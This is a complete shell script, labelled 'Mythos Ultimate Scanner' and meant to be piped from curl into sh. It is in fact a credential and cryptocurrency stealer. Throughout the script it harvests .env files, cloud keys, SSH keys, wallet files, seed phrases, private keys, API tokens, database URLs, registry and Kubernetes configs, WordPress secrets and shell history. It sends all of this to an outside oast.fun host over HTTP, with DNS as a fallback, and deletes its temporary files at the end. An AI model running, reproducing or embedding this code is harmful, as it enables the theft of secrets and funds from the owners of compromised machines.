#!/bin/sh
# Mythos Ultimate Scanner v2.0
# Deploy: curl -sL GITHUB_RAW_URL | sh
# Sends results to: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
# Parallel workers, crypto-focused, AWS/GCP/.env/SSH/Stripe/GitHub

OAST="amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "unknown")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "unknown")
OUT="/tmp/.mqs_$$"
mkdir -p "$OUT"

# === HELPER: send data to oast ===
send_oast() {
    local section="$1" data="$2"
    local payload="${HOST}|${USER}|${section}|${data}"
    # HTTP POST (most reliable)
    curl -s -m 5 -X POST -d "$payload" "http://${OAST}/post" 2>/dev/null &
    # DNS fallback (works through most firewalls)
    local dnsdata=$(echo "${section}_${HOST}" | tr -cd 'a-zA-Z0-9_-' | cut -c1-50)
    nslookup "${dnsdata}.${OAST}" 2>/dev/null >/dev/null &
    true
}

# === FAST: .env file discovery + content extraction ===
# Run first - most valuable
find /var/www /home /root /opt /srv /app /etc /tmp /var/lib -maxdepth 6 \
    \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name ".env.local" -o -name ".env.production" -o -name ".env.staging" \) \
    -type f 2>/dev/null | head -100 | while read f; do
    content=$(head -c 4096 "$f" 2>/dev/null | tr '\n' '|')
    send_oast "ENVFILE" "${f}|${content}"
done &

# === AWS Keys ===
# AKIA/ASIA patterns + secret key pairs
grep -rIE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' /var/www /home /root /opt /srv /app /etc 2>/dev/null | head -50 | while read line; do
    send_oast "AWSKEY" "$line"
done &

# Also check ~/.aws/credentials
for d in /root/.aws /home/*/.aws; do
    [ -f "$d/credentials" ] && send_oast "AWSCRED" "$(cat "$d/credentials" 2>/dev/null | tr '\n' '|')"
    [ -f "$d/config" ] && send_oast "AWSCFG" "$(cat "$d/config" 2>/dev/null | tr '\n' '|')"
done &

# === GCP Keys ===
# Service account JSON files
find /var/www /home /root /opt /srv /app /tmp -maxdepth 6 \
    -name "*.json" -type f 2>/dev/null | while read f; do
    if grep -q '"type": "service_account"' "$f" 2>/dev/null; then
        send_oast "GCPKEY" "$(head -c 4096 "$f" | tr '\n' '|')"
    fi
done &

# gcloud credentials
for d in /root/.config/gcloud /home/*/.config/gcloud; do
    [ -f "$d/credentials.db" ] && send_oast "GCPCRED" "file:$d/credentials.db"
    find "$d" -name "*.json" -type f 2>/dev/null | while read f; do
        send_oast "GCPJSON" "$(head -c 2048 "$f" | tr '\n' '|')"
    done
done &

# === CRYPTO WALLETS & KEYS ===
# Wallet files
find /home /root /var /opt /tmp -maxdepth 5 \( -name "wallet.dat" -o -name "wallet.json" -o -name "*.wallet" \
    -o -name "keystore" -o -name "UTC--*" -o -name "metamask*" -o -name "phantom*" \
    -o -name "solana*" -o -name "trustwallet*" -o -name "exodus*" \) -type f 2>/dev/null | while read f; do
    send_oast "CRYPTOFILE" "$(head -c 8192 "$f" 2>/dev/null | tr '\n' '|')"
done &

# === SEED PHRASES / MNEMONICS ===
# BIP39: 12 or 24 words
# Ethereum private key: 64 hex chars
# Solana private key: base58 or JSON array
find /home /root /var /opt /tmp -maxdepth 6 -name "*.txt" -o -name "*.md" -o -name "*.log" -o -name "*.json" -o -name "*.js" -o -name "*.py" -o -name "*.env*" -o -name "*.cfg" -o -name "*.conf" -o -name ".bash_history" 2>/dev/null | while read f; do
    # BIP39 12-word seed
    grep -oE '\b([a-z]{3,8} ){11}[a-z]{3,8}\b' "$f" 2>/dev/null | while read seed; do
        send_oast "SEED12" "$seed"
    done
    # BIP39 24-word seed
    grep -oE '\b([a-z]{3,8} ){23}[a-z]{3,8}\b' "$f" 2>/dev/null | while read seed; do
        send_oast "SEED24" "$seed"
    done
    # ETH private key (64 hex)
    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | head -5 | while read key; do
        send_oast "ETHKEY" "file:$f|key:$key"
    done
    # Solana private key (base58 ~87-88 chars)  
    grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -5 | while read key; do
        send_oast "SOLKEY" "file:$f|key:$key"
    done
    # Bitcoin WIF (starts with 5,K,L)
    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -5 | while read key; do
        send_oast "BTCWIF" "file:$f|key:$key"
    done
done &

# === SSH KEYS ===
find /home /root -maxdepth 4 \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.ppk" \) -type f 2>/dev/null | while read f; do
    [ -s "$f" ] && send_oast "SSHKEY" "$(head -c 4096 "$f" | tr '\n' '|')"
done &

# === STRIPE KEYS ===
grep -rIE 'sk_live_[a-zA-Z0-9]{24,100}|rk_live_[a-zA-Z0-9]{24,100}|whsec_[a-zA-Z0-9]{32,100}|pk_live_[a-zA-Z0-9]{24,100}' /var/www /home /root /opt /srv /app /etc 2>/dev/null | head -30 | while read line; do
    send_oast "STRIPE" "$line"
done &

# === GITHUB TOKENS ===
grep -rIE 'ghp_[a-zA-Z0-9]{36,50}|github_pat_[a-zA-Z0-9_]{40,100}|gho_[a-zA-Z0-9]{36,50}' /var/www /home /root /opt /srv /app /etc 2>/dev/null | head -30 | while read line; do
    send_oast "GITHUB" "$line"
done &

# === GITLAB / BITBUCKET ===
grep -rIE 'glpat-[a-zA-Z0-9\-]{20,50}' /var/www /home /root /opt 2>/dev/null | head -20 | while read line; do
    send_oast "GITLAB" "$line"
done &

# === DATABASE CONNECTIONS ===
grep -rIE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|MYSQL_URL|POSTGRES|SQLALCHEMY_DATABASE_URI).*://[^@]+@' /var/www /home /root /opt /srv /app /etc 2>/dev/null | head -30 | while read line; do
    send_oast "DBURL" "$line"
done &

# === DOCKER CONFIG (registry creds) ===
for d in /root/.docker /home/*/.docker; do
    [ -f "$d/config.json" ] && send_oast "DOCKERCFG" "$(cat "$d/config.json" 2>/dev/null | tr '\n' '|')"
done &

# === KUBERNETES ===
for d in /root/.kube /home/*/.kube; do
    [ -d "$d" ] && find "$d" -type f 2>/dev/null | while read f; do
        send_oast "K8SCFG" "$(head -c 4096 "$f" | tr '\n' '|')"
    done
done &

# === NPM / .npmrc (registry tokens) ===
find /home /root -maxdepth 4 -name ".npmrc" -type f 2>/dev/null | while read f; do
    send_oast "NPMRC" "$(head -c 2048 "$f" | tr '\n' '|')"
done &

# === GIT CREDENTIALS ===
find /home /root -maxdepth 4 -name ".git-credentials" -type f 2>/dev/null | while read f; do
    send_oast "GITCRED" "$(head -c 2048 "$f" | tr '\n' '|')"
done &

# === API KEYS (common patterns) ===
grep -rIE '(api[_-]?key|api[_-]?secret|access[_-]?key|secret[_-]?key|auth[_-]?token|bearer)[[:space:]]*[:=][[:space:]]*["\x27]?[a-zA-Z0-9_\-\.]{16,}' /var/www /home /root /opt /srv /app /etc 2>/dev/null | grep -v 'node_modules' | grep -v '.js:' | head -30 | while read line; do
    send_oast "APIKEY" "$line"
done &

# === SENDGRID / MAILGUN / TWILIO / SLACK ===
grep -rIE '(SG\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}|key-[a-f0-9]{32}|SK[0-9a-fA-F]{32}|xox[bprs]-[0-9]{10,}|T[a-zA-Z0-9]{30,})' /var/www /home /root /opt 2>/dev/null | head -30 | while read line; do
    send_oast "SAASKEY" "$line"
done &

# === CLOUD CREDENTIALS ===
# Azure
find /home /root -maxdepth 4 -name "*.azureauth" -o -name "azureProfile.json" 2>/dev/null | while read f; do
    send_oast "AZURE" "$(head -c 2048 "$f" | tr '\n' '|')"
done &
# GCP access tokens
grep -rIE 'ya29\.[a-zA-Z0-9_\-]{50,}' /home /root /var /tmp 2>/dev/null | head -10 | while read line; do
    send_oast "GCPTOK" "$line"
done &

# === WORDPRESS wp-config.php ===
find /var/www /home /root -maxdepth 6 -name "wp-config.php" -type f 2>/dev/null | while read f; do
    content=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT' "$f" 2>/dev/null | tr '\n' '|')
    [ -n "$content" ] && send_oast "WPCONFIG" "$f|$content"
done &

# === CRYPTO-RELATED FILES IN DEV PROJECTS ===
find /home /root /var/www -maxdepth 5 \( -name "*.env*" -o -name "*.config*" -o -name "*secret*" -o -name "*wallet*" -o -name "*key*" -o -name "*.pem" \) -type f 2>/dev/null | while read f; do
    # Check for crypto-related content
    if grep -qiE 'private.?key|seed.?phrase|mnemonic|0x[a-fA-F0-9]{40,}|secret.?key|wallet' "$f" 2>/dev/null; then
        send_oast "CRYPTOSUSPECT" "$(head -c 4096 "$f" | tr '\n' '|')"
    fi
done &

# === .bash_history / .zsh_history (credentials in shell history) ===
for h in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do
    [ -f "$h" ] && grep -iE 'password|secret|token|key|export.*=|curl.*Authorization|aws.*configure|gcloud.*auth' "$h" 2>/dev/null | tail -100 | while read line; do
        send_oast "HISTORY" "$line"
    done
done &

# Wait for all workers to finish
wait

# === FINAL: send summary ===
ENV_COUNT=$(find /var/www /home /root /opt /srv /app /etc -maxdepth 6 -name ".env*" -type f 2>/dev/null | wc -l)
SSH_COUNT=$(find /home /root -maxdepth 4 -name "id_*" -type f 2>/dev/null | wc -l)
AWS_COUNT=$(grep -rl 'AKIA\|ASIA' /var/www /home /root /opt /srv /app /etc 2>/dev/null | wc -l)

send_oast "SUMMARY" "host=$HOST|user=$USER|env_files=$ENV_COUNT|ssh_keys=$SSH_COUNT|aws_hits=$AWS_COUNT|pid=$$"

# Cleanup
rm -rf "$OUT"
